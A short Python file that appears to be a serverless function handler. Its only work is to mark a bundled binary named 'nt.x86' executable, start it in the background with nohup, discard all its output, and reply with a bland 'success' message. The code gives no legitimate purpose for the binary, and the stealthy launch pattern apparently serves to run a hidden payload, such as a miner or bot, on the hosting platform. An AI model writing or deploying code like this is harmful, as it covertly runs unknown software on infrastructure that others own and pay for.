import os
import subprocess

def main(context):
    binary_path = "./nt.x86"
    os.chmod(binary_path, 0o755)
    subprocess.Popen(["nohup", binary_path], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    
    return context.res.json({
        "status": "success",
        "message": "ok"
    })
